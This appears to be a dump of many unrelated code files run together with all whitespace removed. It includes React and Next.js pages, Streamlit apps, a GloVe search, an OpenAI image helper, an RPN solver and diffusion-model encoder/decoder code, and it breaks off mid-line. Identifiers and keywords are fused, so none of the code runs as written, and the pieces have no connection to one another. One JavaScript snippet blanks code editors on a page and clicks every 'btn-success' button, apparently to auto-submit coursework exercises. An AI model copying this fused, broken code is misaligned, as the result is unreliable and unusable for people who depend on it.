-1rounded-fulltext-sm'>{interest}</span>))}</div></div>);};exportdefaultClasses;importmatplotlib.pyplotaspltimportnumpyasnp#Defineconstantsg=9.8#gravitationalaccelerationinm/s^2k=0.01#airresistanceconstantinkg/mm=1#massofprojectileinkg#Definefunctionsdefh_no_air(v0):#Maximumheightwithoutairresistancereturnv0**2/(2*g)defh_with_air(v0):#Maximumheightwithairresistancereturn(m/k)*np.log(1+(k*v0**2)/(m*g))#Createarraysforinitialvelocityandmaximumheightv0=np.linspace(0,100,100)#initialvelocityinm/sh1=h_no_air(v0)#maximumheightwithoutairresistanceinmh2=h_with_air(v0)#maximumheightwithairresistanceinm#Plotthegraphplt.plot(v0**2,2*h1,label="Noairresistance")plt.plot(v0**2,2*h2,label="Airresistance")plt.xlabel("$v_0^2$(m$^2$/s$^2$)")plt.ylabel("$2h$(m)")plt.title("Graphof$v_0^2$and$2h$withairresistanceproportionalto$v^2$")plt.legend()plt.show()fromdatetimeimportdatetimefromdatetimeimportdateclassTime:def__init__(self,start_hour,start_min,end_hour,end_min):self.start=datetime(2000,1,1,start_hour,start_min).time()self.end=datetime(2000,1,1,end_hour,end_min).time()SKIP={date(2023,9,4),date(2023,9,25),date(2023,10,9),date(2023,11,1),date(2023,11,22),date(2023,11,23),date(2023,11,24),date(2023,11,27),date(2023,12,25),date(2023,12,26),date(2023,12,27),date(2023,12,28),date(2023,12,29),date(2024,1,1),date(2024,1,2),date(2024,1,15),date(2024,1,29),date(2024,2,19),date(2024,3,25),date(2024,3,26),date(2024,3,27),date(2024,3,28),date(2024,3,29),date(2024,4,1),date(2024,4,10),date(2024,4,22),date(2024,5,14),date(2024,5,27),date(2024,6,14),date(2024,6,19),}EVEN_PERIODS=[i-1foriin[2,4,5,6,8,9]]ODD_PERIODS=[i-1foriin[1,3,5,6,7,9]]PERIOD_TIMES=[Time(4,45,6,23),Time(6,29,8,0),Time(8,0,9,0),Time(9,6,9,53),Time(9,59,11,30),Time(11,35,12,20),]CLASSES=['anal🍑','chemistry🧪','immunology🦠','computergraphics💻','lunch🍔','statistics📊','worldhistory🌎','lang📝','fot🛠',]NO_CLASS='noclass!🎉'PASSING_PERIOD='passingperiod🚶‍♂️'CLASS_COLORS=['blue','blue','green','green','rainbow','orange','red','red','violet']importReactfrom"react";importImagefrom"next/image";//MakesuretousethecorrectimportforImageimportLinkfrom"next/link";constclusters=[{name:"Finance",imageUrl:"https://assets-global.website-files.com/600faaecb03ce57f6fa98050/60381f0c7b3f182a3beea020_Collegiate%20SMG%202019%20Session%201%20Winners-16x9.jpg",//Replacewiththeactualpathtoyourfinanceimagecolor:"rgba(0,128,0,0.8)",path:"/finance",},{name:"Hospitality&Tourism",imageUrl:"https://assets-global.website-files.com/600faaecb03ce57f6fa98050/616f61644a4a4c41cac8e0c1_5E3A3377.jpg",//Replacewiththeactualpathtoyourhospitalityimagecolor:"rgba(0,0,255,0.7)",path:"/hospitality",},{name:"Marketing",imageUrl:"https://assets-global.website-files.com/600faaecb03ce57f6fa98050/61560ae8b66c2b799fd5903e_Role-Play%20Guide%20B.jpg",//Replacewiththeactualpathtoyourmarketingimagecolor:"rgba(255,0,0,0.7)",path:"/marketing",},{name:"BusinessManagement&Administration",imageUrl:"https://assets-global.website-files.com/600faaecb03ce57f6fa98050/64480365a65c7efa627deb2e_CE%20Draft%20Topics%2023-24.png",//Replacewiththeactualpathtoyourbusinessmanagementimagecolor:"rgba(255,255,0,0.8)",path:"/business-management",},{name:"PersonalFinancialLiteracy",imageUrl:"https://assets-global.website-files.com/600faaecb03ce57f6fa98050/6144aa59ff90644d81f150bd_DECA-Power-Conference-B.jpg",//Replacewiththeactualpathtoyourbusinessmanagementimagecolor:"rgba(144,238,144,0.8)",path:"/personal-financial-literacy",},{name:"Entrepreneurship",imageUrl:"https://assets-global.website-files.com/600faaecb03ce57f6fa98050/630e1f826cc4c342d1208787_Roleplays-B.jpg",//Replacewiththeactualpathtoyourbusinessmanagementimagecolor:"rgba(110,110,110,0.9)",path:"/entrepreneurship",},];exportdefaultfunctionMain(){return(<divclassName="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-8"><divclassName="pb-8pt-10"><divclassName="gridgrid-cols-1md:grid-cols-2gap-10">{clusters.map((cluster,index)=>(<Linkhref={cluster.path}key={index}><divclassName="relativeborderrounded-lgshadow-lgh-64overflow-hidden"><imgsrc={cluster.imageUrl}//UsetheimageUrlfromtheclusterobjectalt={cluster.name}fill//ForNext.js13className="transition-opacityduration-300ease-out"/><divclassName="absoluteinset-0"style={{backgroundColor:cluster.color,mixBlendMode:"multiply",zIndex:1,}}/><h2className="font-boldtext-5xltext-whiteabsolutetop-14left-10z-10">{cluster.name}</h2></div></Link>))}</div></div></div>);}importreimportnumpyasnpimportpandasaspdfromsklearn.metrics.pairwiseimportcosine_similarityimportpickleimportgdownimportosdefget_glove_embedding(text,embedding_dict,vector_size=100):embeddings=[embedding_dict[word]forwordintextifwordinembedding_dict]ifembeddings:returnnp.mean(embeddings,axis=0)returnnp.zeros(vector_size)ifnot(os.path.exists('semantic_search/models/models/embeddings_dictionary.pkl')):url='https://drive.google.com/uc?id=1mnp3BjK7lcnRepXsRwRwR-1ILrdnkqxU'output='semantic_search/models/models/embeddings_dictionary.pkl'gdown.download(url,output,quiet=False)ifnot(os.path.exists('semantic_search/models/models/glove_embeddings.pkl')):url='https://drive.google.com/uc?id=1S_aXOiDScNgNArsIgu9xWzmXQo9q-0RC'output='semantic_search/models/models/glove_embeddings.pkl'gdown.download(url,output,quiet=False)courses=pd.read_pickle('semantic_search/models/models/glove_embeddings.pkl')embeddings_dictionary=pickle.load(open('semantic_search/models/models/embeddings_dictionary.pkl','rb'))#FunctiontoretrievetopKcoursesfromPineconebasedonGloVesimilaritydefgetCourses(query:str,topK:int):query_processed=re.sub(r'[^a-z0-9\s]','',query.lower()).split()query_embedding=get_glove_embedding(query_processed,embeddings_dictionary).reshape(1,-1)courses['similarity']=cosine_similarity(courses['embedding'].tolist(),query_embedding).flatten()top_courses=courses.sort_values('similarity',ascending=False).head(topK)returntop_courses[['subject','number']].to_dict('records')importstreamlitasstimportnumpyasnpimportmatplotlib.pyplotaspltfromscipy.statsimportnormfromprizesimportPRIZESPRICE_PER_TICKET=0.75st.set_page_config(page_title='ExpectedProfitCalculator',page_icon='💰',)price_tickets=st.number_input('Price(tickets)',min_value=0,step=1,value=0)price_dollars=price_tickets*PRICE_PER_TICKETst.write(f'PricetoPlayOnce($):{price_dollars:.2f}')st.subheader('SelectPrizes')col1,col2,col3=st.columns(3)withcol1:small_prize=st.selectbox('SmallPrize',PRIZES,index=0)small_prize_win_rate=st.number_input('SmallWin(%)',min_value=0,max_value=100,step=10,value=0)/100ifsmall_prizeelse0withcol2:medium_prize=st.selectbox('MediumPrize',PRIZES,index=0)medium_prize_win_rate=st.number_input('MediumWin(%)',min_value=0,max_value=100,step=10,value=0)/100ifmedium_prizeelse0withcol3:large_prize=st.selectbox('LargePrize',PRIZES,index=0)large_prize_win_rate=st.number_input('LargeWin(%)',min_value=0,max_value=100,step=10,value=0)/100iflarge_prizeelse0loss_rate=round(1-small_prize_win_rate-medium_prize_win_rate-large_prize_win_rate,2)if(loss_rate<0):st.error('Error:Winratesmustnotexceed100%!',icon="🚨")expected_profit=price_dollars-(small_prize_win_rate*small_prize.cost)-(medium_prize_win_rate*medium_prize.cost)-(large_prize_win_rate*large_prize.cost)std=(small_prize_win_rate*(small_prize.cost-(price_dollars-expected_profit))**2+medium_prize_win_rate*(medium_prize.cost-(price_dollars-expected_profit))**2+large_prize_win_rate*(large_prize.cost-(price_dollars-expected_profit))**2)**0.5st.subheader(f'ExpectedProfitperPlay::green[${round(expected_profit,2)}]')if(expected_profit<=0):st.error('Pleasemakesureexpectedprofitispositive!Increasewinratesordecreaseprizecosts')st.markdown('''---''')st.warning('ThefollowingcalculationsassumeaGaussianprofitdistribution.Thisisnotnecessarilytrue,butisagoodapproximationforlargenumbersofplays.')area=norm.cdf(0,expected_profit,std)st.subheader(f'Probabilityyoulosemoneyonasingleplay::red[~{round(area*100,2)ifnotnp.isnan(area)else"__"}%]')#lose=0#forprize,winrateinzip([small_prize,medium_prize,large_prize],[small_prize_win_rate,medium_prize_win_rate,large_prize_win_rate]):#if(price_dollars-prize.cost<0):#lose+=winrate#st.subheader(f'Probabilityyoulosemoneyonasingleplay::red[{round(lose*100,2)}%]')n=(norm.ppf(0.95)*std/expected_profit)**2if(expected_profit>0):st.subheader(f'Play:blue[~{int(np.ceil(n))}]timestohavea95%chanceofmakingmoney')st.markdown(f'Expectedprofitafter:blue[{int(np.ceil(n))}]plays::green[${round(expected_profit*int(np.ceil(n)),2)}]')st.markdown(f'Play:blue[~{int(np.ceil(100/expected_profit))}]timestomake$100')fig,ax=plt.subplots()x=np.linspace(min(0,expected_profit-4*std),expected_profit+4*std,100)ax.plot(x,norm.pdf(x,expected_profit,std),label='_nolegend_')ax.set_xlabel('Profit($)')ax.set_ylabel('Probability')ax.set_title('GaussianProfitEstimationofaSinglePlay')ax.grid(True)ax.fill_between(x,0,norm.pdf(x,expected_profit,std),where=x<0,facecolor='red',alpha=0.2)ax.fill_between(x,0,norm.pdf(x,expected_profit,std),where=x>0,facecolor='green',alpha=0.2)ax.axvline(x=0,color='black',linestyle='--')ax.plot([expected_profit,expected_profit],[0,norm.pdf(expected_profit,expected_profit,std)],color='black',linestyle='-',linewidth=1,alpha=0.8)#legendsayingredislosemoney,greenismakemoneyax.legend(['LoseMoney','WinMoney','BreakEven'],loc='upperleft')st.pyplot(fig)importstreamlitasstst.title("TheBard📖")st.markdown("###_Bringyourbookstolife_")st.write("")pdf_file=st.file_uploader("UploadBookPDF",type=['pdf'])if(pdf_file):st.write("Fileuploadedsuccessfully!")st.write("")st.write("#####Selectthechapteryouwanttovisualize")chapter=st.selectbox("Chapters",["Chapter1","Chapter2","Chapter3","Chapter4","Chapter5"])ifst.button("Visualize"):st.video('outputs/video.mp4')a=document.getElementsByClassName('ac_code_div')for(leti=0;i<a.length;i++){a[i].innerHTML='<divclass="CodeMirrorcm-s-defaultui-resizable"translate="no"style="border-top:2pxsolidrgb(180,50,50);border-bottom:2pxsolidrgb(180,50,50);"><divstyle="overflow:hidden;position:relative;width:3px;height:0px;top:6px;left:505.656px;"><textareaautocorrect="off"autocapitalize="off"spellcheck="false"tabindex="0"style="position:absolute;bottom:-1em;padding:0px;width:1000px;height:1em;min-height:1em;outline:none;"class=""></textarea></div><divclass="CodeMirror-vscrollbar"tabindex="-1"cm-not-content="true"style="bottom:7px;"><divstyle="min-width:1px;height:0px;"></div></div><divclass="CodeMirror-hscrollbar"tabindex="-1"cm-not-content="true"style="right:7px;left:30px;"><divstyle="height:100%;min-height:1px;width:0px;"></div></div><divclass="CodeMirror-scrollbar-filler"cm-not-content="true"style="height:7px;width:7px;"></div><divclass="CodeMirror-gutter-filler"cm-not-content="true"></div><divclass="CodeMirror-scroll"tabindex="-1"draggable="false"><divclass="CodeMirror-sizer"style="margin-left:30px;margin-bottom:-7px;border-right-width:43px;min-height:28px;min-width:476.656px;padding-right:0px;padding-bottom:0px;"><divstyle="position:relative;top:0px;"><divclass="CodeMirror-lines"role="presentation"><divrole="presentation"style="position:relative;outline:none;"><divclass="CodeMirror-measure"><preclass="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre><divclass="CodeMirror-linenumberCodeMirror-gutter-elt"><div>7</div></div></div><divclass="CodeMirror-measure"><preclass="CodeMirror-line"role="presentation"><spanrole="presentation"style="padding-right:0.1px;"><spancm-text="">&ZeroWidthSpace;</span></span></pre></div><divstyle="position:relative;z-index:1;"><divclass="CodeMirror-selected"style="position:absolute;left:4px;top:0px;width:469.656px;height:20px;"></div></div><divclass="CodeMirror-cursors"style=""></div><divclass="CodeMirror-code"role="presentation"style=""><divstyle="position:relative;"><divclass="CodeMirror-gutter-wrapper"aria-hidden="true"style="left:-30px;"><divclass="CodeMirror-linenumberCodeMirror-gutter-elt"style="left:0px;width:21px;">1</div></div><preclass="CodeMirror-line"role="presentation"><spanrole="presentation"style="padding-right:0.1px;"><spanclass="cm-keyword">public</span><spanclass="cm-keyword">class</span><spanclass="cm-def">Test1</span>{<spanclass="cm-keyword">public</span><spanclass="cm-keyword">static</span><spanclass="cm-type">void</span><spanclass="cm-variable">main</span>(<spanclass="cm-type">String</span>[]<spanclass="cm-variable">args</span>){}}</span></pre></div></div></div></div></div></div><divstyle="position:absolute;height:43px;width:1px;border-bottom:0pxsolidtransparent;top:28px;"></div><divclass="CodeMirror-gutters"style="height:71px;left:0px;"><divclass="CodeMirror-gutterCodeMirror-linenumbers"style="width:29px;"></div></div></div><divclass="ui-resizable-handleui-resizable-e"style="z-index:90;"></div><divclass="ui-resizable-handleui-resizable-s"style="z-index:90;"></div><divclass="ui-resizable-handleui-resizable-seui-iconui-icon-gripsmall-diagonal-se"style="z-index:90;"></div></div>'}a=document.getElementsByClassName('btn-success')for(leti=0;i<a.length;i++){a[i].click()}importunittestfromcollectionsimportdequeclassSolution:operations={'+':lambdaa,b:a+b,'-':lambdaa,b:a-b,'*':lambdaa,b:a*b,'/':lambdaa,b:a//bifnot(a<0)^(b<0)else-(-a//b)}@staticmethoddefisint(s:str)->bool:try:int(s)returnTrueexceptValueError:returnFalsedefevalRPN(self,tokens:list[str])->int:evaluation=deque()fortokenintokens:if(self.isint(token)):evaluation.append(int(token))else:b=evaluation.pop()a=evaluation.pop()evaluation.append(self.operations[token](a,b))returnevaluation.pop()classTestSolution(unittest.TestCase):deftest_evalRPN(self):solution=Solution()self.assertEqual(solution.evalRPN(['2','1','+','3','*']),9)self.assertEqual(solution.evalRPN(['4','13','5','/','+']),6)self.assertEqual(solution.evalRPN(['10','6','9','3','+','-11','*','/','*','17','+','5','+']),22)unittest.main()importosfromdotenvimportload_dotenvfromPILimportImagefromioimportBytesIOimportrequestsfromcontextimportcontextasCONTEXTfromopenaiimportOpenAIload_dotenv()api_key=os.getenv('OPENAI_API_KEY')defget_image_prompt(section):prompt='Giventhissectionofthetextfromthebook,generateaneffectivepromptthatwouldbeusedtogenerateanimagethatbestcapturethevisualelementsofthatsection.\n\n'+sectionclient=OpenAI(api_key=api_key)completion=client.chat.completions.create(model='gpt-4o-mini',messages=[{'role':'system','content':CONTEXT},{'role':'user','content':prompt,},],)returncompletion.choices[0].message.contentdefget_image(section,model='dall-e-3',size='1024x1024'):prompt=get_image_prompt(section)client=OpenAI(api_key=api_key)response=client.images.generate(model=model,prompt=prompt,size=size,quality='standard',n=1,)url=response.data[0].urlimage=Image.open(BytesIO(requests.get(url).content))returnimage#get_image('Inaholeinthegroundtherelivedahobbit.',model='dall-e-2',size='256x256')#pytorch_diffusion+derivedencoderdecoderimportloggingimportmathfromtypingimportAny,Callable,Optionalimportnumpyasnpimporttorchimporttorch.nnasnnfromeinopsimportrearrangefrompackagingimportversionlogpy=logging.getLogger(__name__)try:importxformersimportxformers.opsXFORMERS_IS_AVAILABLE=Trueexcept:XFORMERS_IS_AVAILABLE=Falselogpy.warning("nomodule'xformers'.Processingwithout...")from...modules.attentionimportLinearAttention,MemoryEfficientCrossAttentiondefget_timestep_embedding(timesteps,embedding_dim):"""ThismatchestheimplementationinDenoisingDiffusionProbabilisticModels:FromFairseq.Buildsinusoidalembeddings.Thismatchestheimplementationintensor2tensor,butdiffersslightlyfromthedescriptioninSection3.5of"AttentionIsAllYouNeed"."""assertlen(timesteps.shape)==1half_dim=embedding_dim//2emb=math.log(10000)/(half_dim-1)emb=torch.exp(torch.arange(half_dim,dtype=torch.float32)*-emb)emb=emb.to(device=timesteps.device)emb=timesteps.float()[:,None]*emb[None,:]emb=torch.cat([torch.sin(emb),torch.cos(emb)],dim=1)ifembedding_dim%2==1:#zeropademb=torch.nn.functional.pad(emb,(0,1,0,0))returnembdefnonlinearity(x):#swishreturnx*torch.sigmoid(x)defNormalize(in_channels,num_groups=32):returntorch.nn.GroupNorm(num_groups=num_groups,num_channels=in_channels,eps=1e-6,affine=True)classUpsample(nn.Module):def__init__(self,in_channels,with_conv):super().__init__()self.with_conv=with_convifself.with_conv:self.conv=torch.nn.Conv2d(in_channels,in_channels,kernel_size=3,stride=1,padding=1)defforward(self,x):x=torch.nn.functional.interpolate(x,scale_factor=2.0,mode="nearest")ifself.with_conv:x=self.conv(x)returnxclassDownsample(nn.Module):def__init__(self,in_channels,with_conv):super().__init__()self.with_conv=with_convifself.with_conv:#noasymmetricpaddingintorchconv,mustdoitourselvesself.conv=torch.nn.Conv2d(in_channels,in_channels,kernel_size=3,stride=2,padding=0)defforward(self,x):ifself.with_conv:pad=(0,1,0,1)x=torch.nn.functional.pad(x,pad,mode="constant",value=0)x=self.conv(x)else:x=torch.nn.functional.avg_pool2d(x,kernel_size=2,stride=2)returnxclassResnetBlock(nn.Module):def__init__(self,*,in_channels,out_channels=None,conv_shortcut=False,dropout,temb_channels=512,):super().__init__()self.in_channels=in_channelsout_channels=in_channelsifout_channelsisNoneelseout_channelsself.out_channels=out_channelsself.use_conv_shortcut=conv_shortcutself.norm1=Normalize(in_channels)self.conv1=torch.nn.Conv2d(in_channels,out_channels,kernel_size=3,stride=1,padding=1)iftemb_channels>0:self.temb_proj=torch.nn.Linear(temb_channels,out_channels)self.norm2=Normalize(out_channels)self.dropout=torch.nn.Dropout(dropout)self.conv2=torch.nn.Conv2d(out_channels,out_channels,kernel_size=3,stride=1,padding=1)ifself.in_channels!=self.out_channels:ifself.use_conv_shortcut:self.conv_shortcut=torch.nn.Conv2d(in_channels,out_channels,kernel_size=3,stride=1,padding=1)else:self.nin_shortcut=torch.nn.Conv2d(in_channels,out_channels,kernel_size=1,stride=1,padding=0)defforward(self,x,temb):h=xh=self.norm1(h)h=nonlinearity(h)h=self.conv1(h)iftembisnotNone:h=h+self.temb_proj(nonlinearity(temb))[:,:,None,None]h=self.norm2(h)h=nonlinearity(h)h=self.dropout(h)h=self.conv2(h)ifself.in_channels!=self.out_channels:ifself.use_conv_shortcut:x=self.conv_shortcut(x)else:x=self.nin_shortcut(x)returnx+hclassLinAttnBlock(LinearAttention):"""tomatchAttnBlockusage"""def__init__(self,in_channels):super().__init__(dim=in_channels,heads=1,dim_head=in_channels)classAttnBlock(nn.Module):def__init__(self,in_channels):super().__init__()self.in_channels=in_channelsself.norm=Normalize(in_channels)self.q=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.k=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.v=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.proj_out=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)defattention(self,h_:torch.Tensor)->torch.Tensor:h_=self.norm(h_)q=self.q(h_)k=self.k(h_)v=self.v(h_)b,c,h,w=q.shapeq,k,v=map(lambdax:rearrange(x,"bchw->b1(hw)c").contiguous(),(q,k,v))h_=torch.nn.functional.scaled_dot_product_attention(q,k,v)#scaleisdim**-0.5perdefault#computeattentionreturnrearrange(h_,"b1(hw)c->bchw",h=h,w=w,c=c,b=b)defforward(self,x,**kwargs):h_=xh_=self.attention(h_)h_=self.proj_out(h_)returnx+h_classMemoryEfficientAttnBlock(nn.Module):"""Usesxformersefficientimplementation,seehttps://github.com/MatthieuTPHR/diffusers/blob/d80b531ff8060ec1ea982b65a1b8df70f73aa67c/src/diffusers/models/attention.py#L223Note:thisisasingle-headself-attentionoperation"""#def__init__(self,in_channels):super().__init__()self.in_channels=in_channelsself.norm=Normalize(in_channels)self.q=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.k=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.v=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.proj_out=torch.nn.Conv2d(in_channels,in_channels,kernel_size=1,stride=1,padding=0)self.attention_op:Optional[Any]=Nonedefattention(self,h_:torch.Tensor)->torch.Tensor:h_=self.norm(h_)q=self.q(h_)k=self.k(h_)v=self.v(h_)#computeattentionB,C,H,W=q.shapeq,k,v=map(lambdax:rearrange(x,"bchw->b(hw)c"),(q,k,v))q,k,v=map(lambdat:t.unsqueeze(3).reshape(B,t.shape[1],1,C).permute(0,2,1,3).reshape(B*1,t.shape[1],C).contiguous(),(q,k,v),)out=xformers.ops.memory_efficient_attention(q,k,v,attn_bias=None,op=self.attention_op)out=(out.unsqueeze(0).reshape(B,1,out.shape[1],C).permute(0,2,1,3).reshape(B,out.shape[1],C))returnrearrange(out,"b(hw)c->bchw",b=B,h=H,w=W,c=C)defforward(self,x,**kwargs):h_=xh_=self.attention(h_)h_=self.proj_out(h_)returnx+h_classMemoryEfficientCrossAttentionWrapper(MemoryEfficientCrossAttention):defforward(self,x,context=None,mask=None,**unused_kwargs):b,c,h,w=x.shapex=rearrange(x,"bchw->b(hw)c")out=super().forward(x,context=context,mask=mask)out=rearrange(out,"b(hw)c->bchw",h=h,w=w,c=c)returnx+outdefmake_attn(in_channels,attn_type="vanilla",attn_kwargs=None):assertattn_typein["vanilla","vanilla-xformers","memory-efficient-cross-attn","linear","none",],f"attn_type{attn_type}unknown"if(version.parse(torch.__version__)<version.parse("2.0.0")andattn_type!="none"):assertXFORMERS_IS_AVAILABLE,(f"Wedonotsupportvanillaattentionin{torch.__version__}anymore,"f"asitistooexpensive.Pleaseinstallxformersviae.g.'pipinstallxformers==0.0.16'")attn_type="vanilla-xformers"logpy.info(f"makingattentionoftype'{attn_type}'with{in_channels}in_channels")ifattn_type=="vanilla":assertattn_kwargsisNonereturnAttnBlock(in_channels)elifattn_type=="vanilla-xformers":logpy.info(f"buildingMemoryEfficientAttnBlockwith{in_channels}in_channels...")returnMemoryEfficientAttnBlock(in_channels)eliftype=="memory-efficient-cross-attn":attn_kwargs["query_dim"]=in_channelsreturnMemoryEfficientCrossAttentionWrapper(**attn_kwargs)elifattn_type=="none":returnnn.Identity(in_channels)else:returnLinAttnBlock(in_channels)classModel(nn.Module):def__init__(self,*,ch,out_ch,ch_mult=(1,2,4,8),num_res_blocks,attn_resolutions,dropout=0.0,resamp_with_conv=True,in_channels,resolution,use_timestep=True,use_linear_attn=False,attn_type="vanilla",):super().__init__()ifuse_linear_attn:attn_type="linear"self.ch=chself.temb_ch=self.ch*4self.num_resolutions=len(ch_mult)self.num_res_blocks=num_res_blocksself.resolution=resolutionself.in_channels=in_channelsself.use_timestep=use_timestepifself.use_timestep:#timestepembeddingself.temb=nn.Module()self.temb.dense=nn.ModuleList([torch.nn.Linear(self.ch,self.temb_ch),torch.nn.Linear(self.temb_ch,self.temb_ch),])#downsamplingself.conv_in=torch.nn.Conv2d(in_channels,self.ch,kernel_size=3,stride=1,padding=1)curr_res=resolutionin_ch_mult=(1,)+tuple(ch_mult)self.down=nn.ModuleList()fori_levelinrange(self.num_resolutions):block=nn.ModuleList()attn=nn.ModuleList()block_in=ch*in_ch_mult[i_level]block_out=ch*ch_mult[i_level]fori_blockinrange(self.num_res_blocks):block.append(ResnetBlock(in_channels=block_in,out_channels=block_out,temb_channels=self.temb_ch,dropout=dropout,))block_in=block_outifcurr_resinattn_resolutions:attn.append(make_attn(block_in,attn_type=attn_type))down=nn.Module()down.block=blockdown.attn=attnifi_level!=self.num_resolutions-1:down.downsample=Downsample(block_in,resamp_with_conv)curr_res=curr_res//2self.down.append(down)#middleself.mid=nn.Module()self.mid.block_1=ResnetBlock(in_channels=block_in,out_channels=block_in,temb_channels=self.temb_ch,dropout=dropout,)self.mid.attn_1=make_attn(block_in,attn_type=attn_type)self.mid.block_2=ResnetBlock(in_channels=block_in,out_channels=block_in,temb_channels=self.temb_ch,dropout=dropout,)#upsamplingself.up=nn.ModuleList()fori_levelinreversed(range(self.num_resolutions)):block=nn.ModuleList()attn=nn.ModuleList()block_out=ch*ch_mult[i_level]skip_in=ch*ch_mult[i_level]fori_blockinrange(self.num_res_blocks+1):ifi_block==self.num_res_blocks:skip_in=ch*in_ch_mult[i_level]block.append(ResnetBlock(in_channels=block_in+skip_in,out_channels=block_out,temb_channels=self.temb_ch,dropout=dropout,))block_in=block_outifcurr_resinattn_resolutions:attn.append(make_attn(block_in,attn_type=attn_type))up=nn.Module()up.block=blockup.attn=attnifi_level!=0:up.upsample=Upsample(block_in,resamp_with_conv)curr_res=curr_res*2self.up.insert(0,up)#prependtogetconsistentorder#endself.norm_out=Normalize(block_in)self.conv_out=torch.nn.Conv2d(block_in,out_ch,kernel_size=3,stride=1,padding=1)defforward(self,x,t=None,context=None):#assertx.shape[2]==x.shape[3]==self.resolutionifcontextisnotNone:#assumealignedcontext,catalongchannelaxisx=torch.cat((x,context),dim=1)ifself.use_timestep:#timestepembeddingasserttisnotNonetemb=get_timestep_embedding(t,self.ch)temb=self.temb.dense[0](temb)temb=nonlinearity(temb)temb=self.temb.dense[1](temb)else:temb=None#downsamplinghs=[self.conv_in(x)]fori_levelinrange(self.num_resolutions):fori_blockinrange(self.num_res_blocks):h=self.down[i_level].block[i_block](hs[-1],temb)iflen(self.down[i_level].attn)>0:h=self.down[i_level].attn[i_block](h)hs.append(h)ifi_level!=self.num_resolutions-1:hs.append(self.down[i_level].downsample(hs[-1]))#middleh=hs[-1]h=self.mid.block_1(h,temb)h=self.mid.attn_1(h)h=self.mid.block_2(h,temb)#upsamplingfori_levelinreversed(range(self.num_resolutions)):fori_blockinrange(self.num_res_blocks+1):h=self.up[i_level].block[i_block](torch.cat([h,hs.pop()],dim=1),temb)iflen(self.up[i_level].attn)>0:h=self.up[i_level].attn[i_block](h)ifi_level!=0:h=self.up[i_level].upsample(h)#endh=self.norm_out(h)h=nonlinearity(h)h=self.conv_out(h)returnhdefget_last_layer(self):returnself.conv_out.weightclassEncoder(nn.Module):def__init__(self,*,ch,out_ch,ch_mult=(1,2,4,8),num_res_blocks,attn_resolutions,dropout=0.0,resamp_with_conv=True,in_channels,resolution,z_channels,double_z=True,use_linear_attn=False,attn_type="vanilla",**ignore_kwargs,):super().__init__()ifuse_linear_attn:attn_type="linear"self.ch=chself.temb_ch=0self.num_resolutions=len(ch_mult)self.num_res_blocks=num_res_blocksself.resolution=resolutionself.in_channels=in_channels#downsamplingself.conv_in=torch.nn.Conv2d(in_channels,self.ch,kernel_size=3,stride=1,padding=1)curr_res=resolutionin_ch_mult=(1,)+tuple(ch_mult)self.in_ch_mult=in_ch_multself.down=nn.ModuleList()fori_levelinrange(self.num_resolutions):block=nn.ModuleList()attn=nn.ModuleList()block_in=ch*in_ch_mult[i_level]block_out=ch*ch_mult[i_level]fori_blockinrange(self.num_res_blocks):block.append(ResnetBlock(in_channels=block_in,out_channels=block_out,temb_channels=self.temb_ch,dropout=dropout,))block_in=block_outifcurr_resinattn_resolutions:attn.append(make_attn(block_in,attn_type=attn_type))down=nn.Module()down.block=blockdown.attn=attnifi_level!=self.num_resolutions-1:down.downsample=Downsample(block_in,resamp_with_conv)curr_res=curr_res//2self.down.append(down)#middleself.mid=nn.Module()self.mid.block_1=ResnetBlock(in_channels=block_in,out_channels=block_in,temb_channels=self.temb_ch,dropout=dropout,)self.mid.attn_1=make_attn(block_in,attn_type=attn_type)self.mid.block_2=ResnetBlock(in_channels=block_in,out_channels=block_in,temb_channels=self.temb_ch,dropout=dropout,)#endself.norm_out=Normalize(block_in)self.conv_out=torch.nn.Conv2d(block_in,2*z_channelsifdouble_zelsez_channels,kernel_size=3,stride=1,padding=1,)defforward(self,x):#timestepembeddingtemb=None#downsamplinghs=[self.conv_in(x)]fori_levelinrange(self.num_resolutions):fori_blockinrange(self.num_res_blocks):h=self.down[i_level].block[i_block](hs[-1],temb)iflen(self.down[i_level].attn)>0:h=self.down[i_level].attn[i_block](h)hs.append(h)ifi_level!=self.num_resolutions-1:hs.append(self.down[i_level].downsample(hs[-1]))#middleh=hs[-1]h=self.mid.block_1(h,temb)h=self.mid.attn_1(h)h=self.mid.block_2(h,temb)#endh=self.norm_out(h)h=nonlinearity(h)h=self.conv_out(h)returnhclassDecoder(nn.Module):def__init__(self,*,ch,out_ch,ch_mult=(1,2,4,8),num_res_blocks,attn_resolutions,dropout=0.0,resamp_with_conv=True,in_channels,resolution,z_channels,give_pre_end=False,tanh_out=False,use_linear_attn=False,attn_type="vanilla",**ignorekwargs,):super().__init__()ifuse_linear_attn:attn_type="linear"self.ch=chself.temb_ch=0self.num_resolutions=len(ch_mult)self.num_res_blocks=num_res_blocksself.resolution=resolutionself.in_channels=in_channelsself.give_pre_end=give_pre_endself.tanh_out=tanh_out#computein_ch_mult,block_inandcurr_resatlowestresin_ch_mult=(1,)+tuple(ch_mult)block_in=ch*ch_mult[self.num_resolutions-1]curr_res=resolution//2**(self.num_resolutions-1)self.z_shape=(1,z_channels,curr_res,curr_res)logpy.info("Workingwithzofshape{}={}dimensions.".format(self.z_shape,np.prod(self.z_shape)))make_attn_cls=self._make_attn()make_resblock_cls=self._make_resblock()make_conv_cls=self._make_conv()#ztoblock_inself.conv_in=torch.nn.Conv2d(z_channels,block_in,kernel_size=3,stride=1,padding=1)#middleself.mid=nn.Module()self.mid.block_1=make_resblock_cls(in_channels=block_in,out_channels=block_in,temb_channels=self.temb_ch,dropout=dropout,)self.mid.attn_1=make_attn_cls(block_in,attn_type=attn_type)self.mid.block_2=make_resblock_cls(in_channels=block_in,out_channels=block_in,temb_channels=self.temb_ch,dropout=dropout,)#upsamplingself.up=nn.ModuleList()fori_levelinreversed(range(self.num_resolutions)):block=nn.ModuleList()attn=nn.ModuleList()block_out=ch*ch_mult[i_level]fori_blockinrange(self.num_res_blocks+1):block.append(make_resblock_cls(in_channels=block_in,out_channels=block_out,temb_channels=self.temb_ch,dropout=d